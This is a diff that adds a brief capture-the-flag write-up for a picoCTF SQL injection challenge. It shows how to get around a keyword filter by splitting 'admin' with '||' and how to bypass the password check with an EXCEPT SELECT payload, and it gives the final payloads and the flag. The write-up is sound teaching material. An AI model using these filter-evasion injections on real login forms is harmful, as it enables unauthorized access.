@@ -1,0 +1,37 @@
+first we open 2 link /filer.php and /index.php 
+
+/filter.php
+Filters: or and true false union like = > < ; -- /* */ admin
+
+this are the command which are not allowed to be enter so,
+
+so here the OR TRUE admin cant be used 
+
+so we can use '||' and to get the flag we need to use the username admin
+
+and 'admin' is not allowed so if we enter anything in usernamd and password field we get following query
+
+SELECT username, password FROM users WHERE username='admin' AND password='gsdfgdfs' 
+
+
+now as the admin cant be used so we have to use this: ad'||'min'. so our query becomes
+SELECT username, password FROM users WHERE username='ad'||'min'' AND password='gsdfgdfs'
+
+
+so now the ad'||'min''  it is processed as admin
+
+NOW WE NEED TO BYPASS THE PASSWORD TO MAKE THIS HAPPEN WE USE
+
+except and select. so, basically this except command takes 2 input and selects the row1 values which is not present in other row so here as you can see the 
+
+[ 'AND password = '] & [gsdfgdfs'] this too parts are the two values of except but in except command we need the comma seperated valyue like (value1, value2) 
+so we use [ ,' ] in password feiled so we bypassed the password and final payloads become
+
+USERNAME -> ad'||'min' except select
+PASSWORD -> ,'
+
+now our finaly query becomes:
+SELECT username, password FROM users WHERE username='ad'||'min' except select' AND password=',''
+
+and on filter.php we get:
+picoCTF{0n3_m0r3_t1m3_85a265ac}
